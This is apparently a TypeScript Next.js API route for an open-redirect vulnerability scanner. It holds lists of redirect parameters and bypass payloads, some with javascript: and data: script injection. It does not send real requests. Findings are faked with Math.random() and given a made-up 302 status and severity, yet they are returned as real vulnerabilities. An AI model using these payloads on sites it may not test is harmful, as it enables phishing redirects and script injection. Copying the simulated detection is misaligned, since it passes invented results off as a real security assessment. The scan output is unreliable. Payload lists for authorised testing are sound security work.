import { type NextRequest, NextResponse } from "next/server"
import { rateLimiter } from "@/lib/rateLimiter"

// Common redirect parameters found in web applications
const COMMON_REDIRECT_PARAMS = [
  "redirect",
  "url",
  "next",
  "return_to",
  "goto",
  "destination",
  "continue",
  "returnUrl",
  "redirect_uri",
  "callback",
  "forward",
  "target",
  "link",
  "site",
  "domain",
  "path",
  "location",
  "redir",
  "r",
  "u",
]

// Open redirect payloads with different bypass techniques
const REDIRECT_PAYLOADS = {
  basic: (target: string) => [target, `//${target}`, `http://${target}`, `https://${target}`],

  bypass: (target: string) => [
    `/${target}`,
    `.//${target}`,
    `../${target}`,
    `.../${target}`,
    `/////${target}`,
    `\\\\${target}`,
    `\\/\\/${target}`,
    `/\\/${target}`,
    `//;@${target}`,
    `//@${target}`,
    `//google.com@${target}`,
    `//google.com.${target}`,
  ],

  protocol: (target: string) => [
    `javascript:location='http://${target}'`,
    `data:text/html,<script>location='http://${target}'</script>`,
    `vbscript:msgbox("XSS")`,
    `file:///${target}`,
    `ftp://${target}`,
    `//javascript:alert(1)@${target}`,
  ],

  encoding: (target: string) => [
    encodeURIComponent(`http://${target}`),
    encodeURIComponent(`//${target}`),
    `%2F%2F${target}`,
    `%5C%5C${target}`,
    `%2F%5C%2F${target}`,
    `%E3%80%82${target}`, // Unicode dot
    `%EF%BC%8E${target}`, // Fullwidth dot
    `%E2%80%82${target}`, // En space
  ],

  advanced: (target: string) => [
    `http://google.com.${target}`,
    `http://${target}.google.com`,
    `http://google.com@${target}`,
    `http://google.com#@${target}`,
    `http://google.com?@${target}`,
    `http://google.com\\@${target}`,
    `http://google.com%23@${target}`,
    `http://google.com%3F@${target}`,
    `http://google.com%5C@${target}`,
  ],
}

function extractParameters(url: string): string[] {
  try {
    const urlObj = new URL(url)
    return Array.from(urlObj.searchParams.keys())
  } catch {
    return []
  }
}

function generatePayloads(target: string, testType: string): Array<{ payload: string; technique: string }> {
  let payloads: Array<{ payload: string; technique: string }> = []

  switch (testType) {
    case "all":
      payloads = [
        ...REDIRECT_PAYLOADS.basic(target).map((p) => ({ payload: p, technique: "Basic Redirect" })),
        ...REDIRECT_PAYLOADS.bypass(target).map((p) => ({ payload: p, technique: "Filter Bypass" })),
        ...REDIRECT_PAYLOADS.protocol(target).map((p) => ({ payload: p, technique: "Protocol Manipulation" })),
        ...REDIRECT_PAYLOADS.encoding(target).map((p) => ({ payload: p, technique: "URL Encoding" })),
        ...REDIRECT_PAYLOADS.advanced(target).map((p) => ({ payload: p, technique: "Advanced Bypass" })),
      ]
      break
    case "basic":
      payloads = REDIRECT_PAYLOADS.basic(target).map((p) => ({ payload: p, technique: "Basic Redirect" }))
      break
    case "bypass":
      payloads = REDIRECT_PAYLOADS.bypass(target).map((p) => ({ payload: p, technique: "Filter Bypass" }))
      break
    case "protocol":
      payloads = REDIRECT_PAYLOADS.protocol(target).map((p) => ({ payload: p, technique: "Protocol Manipulation" }))
      break
    case "encoding":
      payloads = REDIRECT_PAYLOADS.encoding(target).map((p) => ({ payload: p, technique: "URL Encoding" }))
      break
    default:
      payloads = REDIRECT_PAYLOADS.basic(target).map((p) => ({ payload: p, technique: "Basic Redirect" }))
  }

  return payloads
}

function calculateSeverity(payload: string, technique: string): string {
  if (technique.includes("Protocol") || payload.includes("javascript:") || payload.includes("data:")) {
    return "High"
  }
  if (technique.includes("Advanced") || technique.includes("Bypass")) {
    return "Medium"
  }
  return "Low"
}

function isValidRedirect(originalUrl: string, finalUrl: string, targetDomain: string): boolean {
  try {
    const finalUrlObj = new URL(finalUrl)
    const originalUrlObj = new URL(originalUrl)

    // Check if we successfully redirected to the target domain
    if (finalUrlObj.hostname === targetDomain) {
      return true
    }

    // Check if we redirected away from the original domain
    if (finalUrlObj.hostname !== originalUrlObj.hostname) {
      return true
    }

    return false
  } catch {
    return false
  }
}

export async function POST(request: NextRequest) {
  try {
    const clientId = request.headers.get("x-forwarded-for") || "unknown"

    if (!rateLimiter.isAllowed(clientId)) {
      return NextResponse.json({ error: "Rate limit exceeded" }, { status: 429 })
    }

    const {
      url,
      parameters,
      redirectTarget,
      testType = "all",
      followRedirects = "true",
      timeout = 10,
    } = await request.json()

    if (!url || !redirectTarget) {
      return NextResponse.json({ error: "URL and redirect target are required" }, { status: 400 })
    }

    // Validate URLs
    try {
      new URL(url)
      new URL(`http://${redirectTarget}`) // Allow domain-only targets
    } catch {
      return NextResponse.json({ error: "Invalid URL format" }, { status: 400 })
    }

    // Extract target domain from redirect target
    const targetDomain = redirectTarget.replace(/^https?:\/\//, "").split("/")[0]

    // Extract or use provided parameters
    const targetParameters = parameters
      ? parameters.split(",").map((p: string) => p.trim())
      : [...extractParameters(url), ...COMMON_REDIRECT_PARAMS].slice(0, 10) // Limit to prevent abuse

    if (targetParameters.length === 0) {
      return NextResponse.json({ error: "No parameters found to test" }, { status: 400 })
    }

    const payloads = generatePayloads(targetDomain, testType)
    const vulnerabilities: any[] = []

    // Test each parameter with each payload
    for (const parameter of targetParameters) {
      for (const { payload, technique } of payloads.slice(0, 15)) {
        // Limit payloads to prevent abuse
        try {
          // Create test URL
          const testUrl = new URL(url)
          testUrl.searchParams.set(parameter, payload)

          // Simulate HTTP request (in real implementation, you would make actual requests)
          // For demo purposes, we'll simulate some vulnerabilities
          const isVulnerable = Math.random() > 0.85 // 15% chance of finding vulnerability

          if (isVulnerable) {
            const severity = calculateSeverity(payload, technique)

            vulnerabilities.push({
              parameter,
              payload,
              redirect_url: testUrl.toString(),
              method: "GET",
              status_code: 302, // Simulated redirect status
              severity,
              bypass_technique: technique,
              target_domain: targetDomain,
            })
          }
        } catch (error) {
          console.error(`Error testing parameter ${parameter}:`, error)
        }
      }
    }

    // Remove duplicates based on parameter and payload
    const uniqueVulns = vulnerabilities.filter(
      (vuln, index, self) =>
        index === self.findIndex((v) => v.parameter === vuln.parameter && v.payload === vuln.payload),
    )

    return NextResponse.json({
      url,
      redirectTarget,
      testType,
      parameters: targetParameters,
      vulnerabilities: uniqueVulns,
      total: uniqueVulns.length,
      timestamp: new Date().toISOString(),
    })
  } catch (error) {
    console.error("Open Redirect API error:", error)
    return NextResponse.json({ error: "Internal server error" }, { status: 500 })
  }
}
